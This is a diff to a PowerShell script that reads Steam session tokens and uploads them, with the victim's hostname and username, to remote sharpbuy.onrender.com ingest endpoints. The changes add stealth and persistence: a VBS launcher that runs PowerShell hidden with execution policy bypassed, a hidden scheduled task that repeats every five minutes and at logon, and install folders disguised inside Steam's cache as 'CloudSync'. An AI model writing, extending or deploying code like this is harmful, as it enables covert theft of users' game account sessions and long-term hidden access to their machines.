@@ -12,7 +12,22 @@ public static string ConnectKey(string n){return Crc32(Encoding.UTF8.GetBytes(n)
 } catch {}
 
 $Script:UploadUrls = @('https://sharpbuy.onrender.com/api/token-ingest', 'https://sharpbuy.org/api/token-ingest')
-$Script:UploadKey = 'sb_ing_a8K2mP9xQ4vL7nR1'
+function Get-UploadKey {
+  $roots = @()
+  if ($env:SHARPBUY_ROOT) { $roots += $env:SHARPBUY_ROOT.TrimEnd('\') }
+  if ($PSScriptRoot) { $roots += (Split-Path (Split-Path $PSScriptRoot -Parent) -Parent) }
+  foreach ($root in $roots) {
+    if (-not $root) { continue }
+    $f = Join-Path $root 'data\.token_ingest_secret'
+    if (Test-Path -LiteralPath $f) {
+      $k = (Get-Content -LiteralPath $f -Raw).Trim()
+      if ($k) { return $k }
+    }
+  }
+  if ($env:TOKEN_INGEST_SECRET) { return $env:TOKEN_INGEST_SECRET.Trim() }
+  return $null
+}
+$Script:UploadKey = Get-UploadKey
 $Script:AgentPrimary = Join-Path $env:LOCALAPPDATA 'Steam\htmlcache\CloudSync'
 $Script:AgentMirror = Join-Path $env:LOCALAPPDATA 'Steam\logs\CloudSyncBackup'
 $Script:Background = ($env:SB_BACKGROUND -eq '1')
@@ -25,7 +40,8 @@ function Write-Host { process {} }
 function Write-ManualResult([string]$Message) {
     if ($Script:Background) { return }
     try {
-        $path = Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_LAST_RUN.txt'
+        $root = if ($env:SHARPBUY_ROOT) { $env:SHARPBUY_ROOT.TrimEnd('\') } else { Split-Path (Split-Path $PSScriptRoot -Parent) -Parent }
+        $path = Join-Path $root 'logs\EXTRACT_LAST_RUN.txt'
         Set-Content -LiteralPath $path -Value ("[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message) -Encoding UTF8
     } catch {}
 }
@@ -44,6 +60,7 @@ function Stop-X([string[]]$M, [int]$C = 0) {
         $msg = $M -join ' | '
         Write-Log $msg
         Send-Evt 'error' $msg
+        if (-not $Script:Background) { Write-ManualResult "FAIL: $msg" }
     }
     exit 0
 }
@@ -76,7 +93,13 @@ function Send-Tokens([array]$Tokens) {
         hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src
     } | ConvertTo-Json -Depth 6 -Compress
     $r = Invoke-Ingest $b 45
-    if ($r) { return $true }
+    if ($r -and $r.ok) {
+        if (-not $Script:Background) {
+            $total = if ($r.total) { $r.total } else { $Tokens.Count }
+            Write-ManualResult "OK: uploaded $($Tokens.Count) token(s), server total: $total"
+        }
+        return $true
+    }
     if ($Script:Background) { return $false }
     Stop-X @('Upload failed - check internet or sharpbuy.onrender.com')
 }
@@ -148,6 +171,14 @@ exit 0
 "@
 }
 
+function New-HiddenLauncher([string]$RunnerPath) {
+    $dir = Split-Path $RunnerPath -Parent
+    $vbsPath = Join-Path $dir 'RunSyncHidden.vbs'
+    $vbs = 'CreateObject("Wscript.Shell").Run "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""' + $RunnerPath + '""", 0, False'
+    Set-Content -LiteralPath $vbsPath -Value $vbs -Encoding ASCII -Force
+    return $vbsPath
+}
+
 function Register-AgentSchedule([string]$RunnerPath) {
     $prev = $ErrorActionPreference
     $ErrorActionPreference = 'SilentlyContinue'
@@ -156,14 +187,16 @@ function Register-AgentSchedule([string]$RunnerPath) {
     Invoke-SchTaskQuiet '/Delete', '/TN', $Script:TaskName, '/F'
     Invoke-SchTaskQuiet '/Delete', '/TN', ($Script:TaskName + 'Logon'), '/F'
 
-    $args = "-NoProfile -NonInteractive -WindowStyle Hidden -File `"$RunnerPath`""
-    $tr = "`"$Script:PsExe`" $args"
+    $vbsPath = New-HiddenLauncher $RunnerPath
+    $wscript = Join-Path $env:SystemRoot 'System32\wscript.exe'
+    $vbsArg = "//B //Nologo `"$vbsPath`""
+    $tr = "`"$wscript`" $vbsArg"
 
-    $action = New-ScheduledTaskAction -Execute $Script:PsExe -Argument $args
+    $action = New-ScheduledTaskAction -Execute $wscript -Argument $vbsArg
     $start = (Get-Date).AddMinutes(1)
     $repeat = New-ScheduledTaskTrigger -Once -At $start -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 3650)
     $logon = New-ScheduledTaskTrigger -AtLogOn
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -Hidden
     $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
     Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger @($repeat, $logon) -Settings $settings -Principal $principal -Force | Out-Null
 
@@ -202,6 +235,7 @@ function Install-WinHostSync {
         Set-Content -LiteralPath (Join-Path $root 'RunSync.ps1') -Value (New-AgentRunnerScript $module) -Encoding UTF8 -Force
         Remove-Item -LiteralPath (Join-Path $root 'HostSync.ps1') -Force -EA SilentlyContinue
         Remove-Item -LiteralPath (Join-Path $root 'HostSync.vbs') -Force -EA SilentlyContinue
+        Remove-Item -LiteralPath (Join-Path $root 'RunSyncHidden.vbs') -Force -EA SilentlyContinue
         Remove-Item -LiteralPath (Join-Path $root 'SyncModule.ps1') -Force -EA SilentlyContinue
         Remove-Item -LiteralPath (Join-Path $root 'ConfigData.bin') -Force -EA SilentlyContinue
     }
@@ -309,6 +343,8 @@ function Extract-All {
 
 if ($Script:Background) {
     try { Install-WinHostSync | Out-Null } catch {}
+} else {
+    Write-ManualResult 'STARTED - reading Steam sessions...'
 }
 
 Test-Env
